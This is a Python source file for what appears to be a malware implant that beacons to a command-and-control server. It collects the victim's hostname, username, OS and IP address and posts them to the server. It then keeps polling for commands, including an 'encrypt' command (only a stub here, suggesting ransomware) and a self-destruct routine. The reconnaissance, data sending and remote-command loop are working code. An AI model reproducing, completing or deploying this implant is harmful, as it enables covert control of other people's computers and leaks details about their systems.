import os
import sys
import time
import socket
import json
import subprocess
import requests
from functions.shared import self_destruct

def get_sysinfo():
    """ return sys information """
    try:
        sysinfo = {
            "hostname": socket.gethostname(),
            "username": os.getlogin(),
            "os": f"{os.name} {sys.platform}",
            "ip": socket.gethostbyname(socket.gethostname()),
            "process": sys.argv[0]
        }
        return sysinfo
    except:
        pass

def first_checkin(SERVER_URL, json_info):
    """ Check in with the c2 server """
    try:
        response = requests.post(SERVER_URL, json=json_info)
        print(f"Sent: {json_info}")
        print(f"Response: {response.text}")
        return response.status_code == 200
    except:
        print("Error")
        return False
    
def run_command(command):
    """ Checks response from server for command and then run based on it """
    print(f"The command is {command}")

    if command == "encrypt":
        print("Encrypting files")
    elif command == "self-destruct":
        self_destruct()
    else:
        print("Still haven't implemented")

def persistent_checkin(SERVER_URL, json_info, interval):
    """ Check in with the c2 server continuously """
    while True:
        try:
            response = requests.post(SERVER_URL, json=json_info)
            if response.status_code == 200:
                cmd_response = response.json()
                cmd = cmd_response.get("command", None)
                if cmd and cmd != "None":
                    run_command(cmd)
                else:
                    print("No new command")
            else:
                print(f"Failed, {response.status_code} - {response.text}")
        except:
            print("Failed!")

        time.sleep(interval)